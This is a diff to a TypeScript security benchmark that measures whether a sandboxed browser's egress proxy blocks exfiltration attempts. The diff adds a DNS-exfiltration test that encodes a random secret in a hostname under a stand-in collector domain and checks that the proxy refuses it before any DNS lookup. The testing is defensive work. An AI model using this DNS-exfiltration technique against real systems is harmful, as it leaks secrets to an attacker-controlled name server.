@@ -16,7 +16,11 @@ const CANARY_URL = (process.env.CANARY_URL ?? "http://localhost:4000/canary").re
 const CANARY_API = CANARY_URL.replace(/\/canary$/, "/api/canary");
 const demoHost = new URL(DEMO_URL).hostname;
 
-type Case = { name: string; label: string; layer: string; blocked: number; blockedHosts: string[]; offsiteAllowed: number; canaryHits: number; reasons: string[] };
+// `fired` = the attack actually attempted egress (something was blocked,
+// allowed off-site, or hit the canary). A row with 0 "got out" is only
+// reassuring if it fired; 0 with fired=false means the attack never ran, not
+// that the sandbox stopped it. `preDnsBlock` = refused before any DNS lookup.
+type Case = { name: string; label: string; layer: string; blocked: number; blockedHosts: string[]; offsiteAllowed: number; canaryHits: number; reasons: string[]; fired: boolean; preDnsBlock?: boolean };
 
 const canaryHits = async (token: string) => ((await (await fetch(`${CANARY_API}/${token}`)).json()) as { hits: number }).hits;
 
@@ -33,6 +37,7 @@ async function runCase(name: string, label: string, allowHost: string, act: (sb:
   await new Promise((r) => setTimeout(r, 1500));
   const blocked = events.filter((e) => e.type === "blocked");
   const offsite = events.filter((e) => e.type === "allowed" && e.host !== allowHost);
+  const hits = await canaryHits(token);
   return {
     name,
     label,
@@ -40,8 +45,9 @@ async function runCase(name: string, label: string, allowHost: string, act: (sb:
     blocked: blocked.length,
     blockedHosts: [...new Set(blocked.map((e) => e.host ?? "?"))],
     offsiteAllowed: offsite.length,
-    canaryHits: await canaryHits(token),
+    canaryHits: hits,
     reasons: [...new Set(blocked.map((e) => e.reason ?? "?"))],
+    fired: blocked.length + offsite.length + hits > 0,
   };
 }
 
@@ -83,6 +89,23 @@ const dnsCase = await runCase("dns-to-metadata", "Allowlisted hostname whose DNS
 cases.push(dnsCase);
 console.log(`blocked ${dnsCase.blocked} (${dnsCase.reasons.join(", ")})`);
 
+// DNS exfiltration: a page tries to leak a secret by encoding it in a
+// hostname it asks the browser to resolve (SECRET.collector.example.net).
+// The data would leak to the attacker's authoritative name server in the DNS
+// query itself, before any HTTP connection. The proxy checks the allowlist
+// BEFORE it resolves anything, so an off-allowlist name is never looked up:
+// the secret-bearing query never leaves the sandbox. We assert the refusal
+// reason is "not on the allowlist" (pre-DNS), not "DNS lookup failed".
+process.stdout.write("dns-exfil … ");
+const secretLabel = randomBytes(8).toString("hex");
+const exfilHost = `${secretLabel}.collector.example.net`;
+const dnsExfil = await runCase("dns-exfil", `DNS exfiltration: a secret encoded in a hostname the page resolves (${exfilHost})`, demoHost, async (sb) => {
+  await sb.send("goto", { url: `http://${exfilHost}/` }).catch(() => {});
+});
+dnsExfil.preDnsBlock = dnsExfil.blocked > 0 && dnsExfil.reasons.every((r) => /allowlist/i.test(r));
+cases.push(dnsExfil);
+console.log(`blocked ${dnsExfil.blocked} (${dnsExfil.reasons.join(", ")}) preDnsBlock=${dnsExfil.preDnsBlock}`);
+
 // Control: the same canary, hit from outside the sandbox, must count.
 const control = randomBytes(8).toString("hex");
 await fetch(`${CANARY_URL}/${control}`).catch(() => {});
@@ -92,6 +115,7 @@ const result = {
   at: new Date().toISOString(),
   sandbox: "docker",
   attacks: cases.length,
+  fired: cases.filter((c) => c.fired).length,
   blocked: cases.reduce((n, c) => n + c.blocked, 0),
   offsiteAllowed: cases.reduce((n, c) => n + c.offsiteAllowed, 0),
   canaryHits: cases.reduce((n, c) => n + c.canaryHits, 0),
@@ -100,7 +124,7 @@ const result = {
 };
 await mkdir(DATA_DIR, { recursive: true });
 await writeFile(path.join(DATA_DIR, "bench.json"), JSON.stringify(result, null, 2));
-console.log(`\n${result.attacks} attacks · ${result.blocked} requests blocked · ${result.offsiteAllowed} off-site requests allowed · canary hits ${result.canaryHits} (control from outside: ${controlHits})`);
-console.log("\n| Attack | Blocked requests | Got out |\n|---|---|---|");
-for (const c of cases) console.log(`| ${c.label} | ${c.blocked} | ${c.offsiteAllowed + c.canaryHits === 0 ? "nothing" : `${c.offsiteAllowed} allowed, ${c.canaryHits} canary hits`} |`);
+console.log(`\n${result.attacks} attacks · ${result.fired} actually fired · ${result.blocked} requests blocked · ${result.offsiteAllowed} off-site requests allowed · canary hits ${result.canaryHits} (control from outside: ${controlHits})`);
+console.log("\n| Attack | Fired | Blocked requests | Got out |\n|---|---|---|---|");
+for (const c of cases) console.log(`| ${c.label} | ${c.fired ? "yes" : "no"} | ${c.blocked} | ${c.offsiteAllowed + c.canaryHits === 0 ? "nothing" : `${c.offsiteAllowed} allowed, ${c.canaryHits} canary hits`} |`);
 process.exit(0);
